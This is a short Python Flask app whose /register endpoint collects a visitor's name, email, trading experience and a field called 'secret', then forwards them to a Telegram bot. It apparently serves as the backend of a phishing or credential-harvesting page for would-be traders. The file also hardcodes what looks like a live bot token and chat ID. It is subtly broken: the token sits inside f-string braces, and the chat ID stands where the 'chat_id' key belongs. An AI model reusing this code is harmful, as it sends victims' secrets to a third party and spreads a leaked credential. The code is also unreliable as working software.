from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    username = data.get("username")
    email = data.get("email")
    experience = data.get("experience")
    secret = data.get("secret")

    message = (
        f"🧠 New Real Trader Registered!\n"
        f"Name: {username}\n"
        f"Email: {email}\n"
        f"Experience: {experience}\n"
        f"Secret: {secret}"
    )

    url = f"https://api.telegram.org/bot{7271224033:AAH22jbuHkyvJQuiP_HhqMeN9NjADo6J7vk}/sendMessage"
    payload = {"-1002826854422": CHAT_ID, "text": message}

    try:
        res = requests.post(url, json=payload)
        if res.status_code == 200:
            return jsonify({"status": "sent"}), 200
        else:
            return jsonify({"status": "failed", "error": res.text}), 500
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
